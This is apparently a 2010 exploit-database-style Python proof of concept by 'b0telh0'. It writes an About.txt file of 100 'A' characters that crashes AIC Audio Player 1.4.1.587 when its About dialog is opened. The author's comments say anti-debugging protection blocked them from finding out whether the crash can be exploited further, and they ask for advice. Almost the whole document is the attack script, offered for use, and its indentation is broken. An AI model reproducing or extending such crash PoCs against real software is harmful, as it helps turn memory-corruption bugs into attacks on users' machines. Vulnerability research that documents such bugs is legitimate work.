#!/usr/bin/python
#
# Title: AIC Audio Player 1.4.1.587 Local Crash PoC
# Date: 01-26-2010
# Author: b0telh0
# Link: http://www.aic-media.com/Download/Setup_AICAudioPlayer.exe
# Tested on: Windows XP SP3

# I couldn't even debug it. There's some anti-debugging protection...
# Tried !hidedebug from immunity debugger too...
# So, i'm not sure if we have more than just a crash!
# If someone have any advice, it would be cool learning about
anti-debugging techniques.


crash = "\x41" * 100

try:
file = open('About.txt','w');
file.write(crash);
file.close();
print "[+] Created About.txt file.\n"
print "[+] Copy it to AudioPlayer folder...\n"
print "[+] Run AICAudioPlayer and hit About!"
except:
print "[-] Error cant write file to system."